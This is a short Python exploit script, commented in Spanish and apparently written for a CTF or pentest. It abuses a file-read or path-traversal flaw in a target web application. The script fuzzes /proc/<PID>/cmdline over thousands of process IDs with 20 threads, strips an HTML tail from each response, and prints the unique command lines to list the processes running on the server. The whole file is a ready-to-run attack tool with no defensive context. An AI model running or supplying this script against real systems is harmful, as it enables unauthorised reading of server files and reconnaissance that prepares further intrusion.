#!/usr/bin/python3
import requests
import signal
import sys
import re
from pwn import *
from threading import Thread

NUM_HILOS = 20
print("Fuzzing procesos -> Abusing /proc/PROCESO/cmdline path")
URL = sys.argv[1]
def handler(sig,frame):
	sys.exit(1)

signal.signal(signal.SIGINT,handler)

p1 = log.progress("Procesos")
repeticiones = []

def fuzzing(x,y):
	for i in range(x,y):
		try:
			url = URL + "/proc/{0}/cmdline".format(i)
			r = requests.get(url)
			p1.status(f"Probando con proceso n -> {i}")
			if len(r.text) > 82:
				content = r.text
				caca = ">window.close()</script>"
				filtro = re.split('/cmdline/',content)[3].replace(caca, '')
				if filtro not in repeticiones:
					repeticiones.append(filtro)
					print(f"  >  {i} -> /{filtro}")
				else:
					pass
		except IndexError:
			pass

y = 0
z = 500
threads = []
for i in range(NUM_HILOS):
    t = Thread(target=fuzzing, args=(y,z))
    threads.append(t)
    t.start()
    y += 500
    z += 500
